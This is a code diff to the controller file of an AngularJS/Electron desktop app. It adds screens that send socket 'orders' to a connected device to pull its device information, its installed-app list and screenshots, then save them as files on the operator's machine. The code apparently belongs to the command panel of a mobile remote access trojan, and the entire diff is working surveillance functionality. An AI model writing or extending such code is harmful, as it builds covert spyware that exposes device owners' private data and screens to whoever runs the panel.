@@ -45,6 +45,18 @@ app.config(function ($routeProvider) {
         .when("/location", {
             templateUrl: "./views/location.html",
             controller: "LocCtrl"
+        })
+        .when("/deviceInfo", {
+            templateUrl: "./views/deviceInfo.html",
+            controller: "DevCtrl"
+        })
+        .when("/installedApps", {
+            templateUrl: "./views/installedApps.html",
+            controller: "AppsCtrl"
+        })
+        .when("/screenCapture", {
+            templateUrl: "./views/screenCapture.html",
+            controller: "ScrCtrl"
         });
 });
 
@@ -608,4 +620,147 @@ app.controller("LocCtrl", function ($scope, $rootScope) {
 
     });
 
+});
+
+
+//-----------------------Device Info Controller (deviceInfo.htm)------------------------
+app.controller("DevCtrl", function ($scope, $rootScope) {
+    $DevCtrl = $scope;
+    var deviceInfo = CONSTANTS.orders.deviceInfo;
+
+    $DevCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(deviceInfo);
+    });
+
+    $DevCtrl.Refresh = () => {
+        $DevCtrl.load = 'loading';
+        $DevCtrl.info = null;
+        $rootScope.Log('Get Device Info..');
+        socket.emit(ORDER, { order: deviceInfo });
+    }
+
+    $DevCtrl.load = 'loading';
+    $rootScope.Log('Get Device Info..');
+    socket.emit(ORDER, { order: deviceInfo });
+
+    socket.on(deviceInfo, (data) => {
+        $DevCtrl.load = '';
+        if (data.model) {
+            $rootScope.Log('Device info arrived', CONSTANTS.logStatus.SUCCESS);
+            $DevCtrl.info = data;
+            $DevCtrl.$apply();
+        } else {
+            $rootScope.Log('Failed to get device info', CONSTANTS.logStatus.FAIL);
+            $DevCtrl.$apply();
+        }
+    });
+});
+
+
+//-----------------------Installed Apps Controller (installedApps.htm)------------------------
+app.controller("AppsCtrl", function ($scope, $rootScope) {
+    $AppsCtrl = $scope;
+    var installedApps = CONSTANTS.orders.installedApps;
+
+    $AppsCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(installedApps);
+    });
+
+    $AppsCtrl.Refresh = () => {
+        $AppsCtrl.load = 'loading';
+        $AppsCtrl.appsList = null;
+        $rootScope.Log('Get Installed Apps..');
+        socket.emit(ORDER, { order: installedApps });
+    }
+
+    $AppsCtrl.barLimit = 50;
+    $AppsCtrl.increaseLimit = () => {
+        $AppsCtrl.barLimit += 50;
+    }
+
+    $AppsCtrl.SaveApps = () => {
+        if (!$AppsCtrl.appsList || $AppsCtrl.appsList.length == 0)
+            return;
+
+        var csvRows = [];
+        for (var i = 0; i < $AppsCtrl.appsList.length; i++) {
+            csvRows.push($AppsCtrl.appsList[i].name + "," + $AppsCtrl.appsList[i].package);
+        }
+
+        var csvStr = csvRows.join("\n");
+        var csvPath = path.join(downloadsPath, "Apps_" + Date.now() + ".csv");
+        $rootScope.Log("Saving Apps List...");
+        fs.outputFile(csvPath, csvStr, (error) => {
+            if (error)
+                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
+            else
+                $rootScope.Log("Apps List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
+        });
+    }
+
+    $AppsCtrl.load = 'loading';
+    $rootScope.Log('Get Installed Apps..');
+    socket.emit(ORDER, { order: installedApps });
+
+    socket.on(installedApps, (data) => {
+        if (data.appsList) {
+            $AppsCtrl.load = '';
+            $rootScope.Log('Apps list arrived', CONSTANTS.logStatus.SUCCESS);
+            $AppsCtrl.appsList = data.appsList;
+            $AppsCtrl.appsSize = data.appsList.length;
+            $AppsCtrl.$apply();
+        }
+    });
+});
+
+
+//-----------------------Screen Capture Controller (screenCapture.htm)------------------------
+app.controller("ScrCtrl", function ($scope, $rootScope) {
+    $ScrCtrl = $scope;
+    var screenCapture = CONSTANTS.orders.screenCapture;
+
+    $ScrCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(screenCapture);
+    });
+
+    $ScrCtrl.Capture = () => {
+        $ScrCtrl.load = 'loading';
+        $ScrCtrl.imgUrl = null;
+        $ScrCtrl.isSaveShown = false;
+        $rootScope.Log('Capturing screen..');
+        socket.emit(ORDER, { order: screenCapture });
+    }
+
+    $ScrCtrl.isSaveShown = false;
+
+    socket.on(screenCapture, (data) => {
+        if (data.file == true) {
+            $rootScope.Log('Screenshot arrived', CONSTANTS.logStatus.SUCCESS);
+            var uint8Arr = new Uint8Array(data.buffer);
+            var binary = '';
+            for (var i = 0; i < uint8Arr.length; i++) {
+                binary += String.fromCharCode(uint8Arr[i]);
+            }
+            var base64String = window.btoa(binary);
+            $ScrCtrl.imgUrl = 'data:image/png;base64,' + base64String;
+            $ScrCtrl.load = '';
+            $ScrCtrl.isSaveShown = true;
+            $ScrCtrl.$apply();
+
+            $ScrCtrl.SaveScreen = () => {
+                $rootScope.Log('Saving screenshot..');
+                var filePath = path.join(downloadsPath, data.name);
+                fs.outputFile(filePath, data.buffer, (err) => {
+                    if (err)
+                        $rootScope.Log('Saving screenshot failed', CONSTANTS.logStatus.FAIL);
+                    else
+                        $rootScope.Log('Screenshot saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
+                });
+            }
+        } else if (data.error) {
+            $rootScope.Log('Screen capture failed: ' + data.error, CONSTANTS.logStatus.FAIL);
+            $ScrCtrl.load = '';
+            $ScrCtrl.$apply();
+        }
+    });
 });
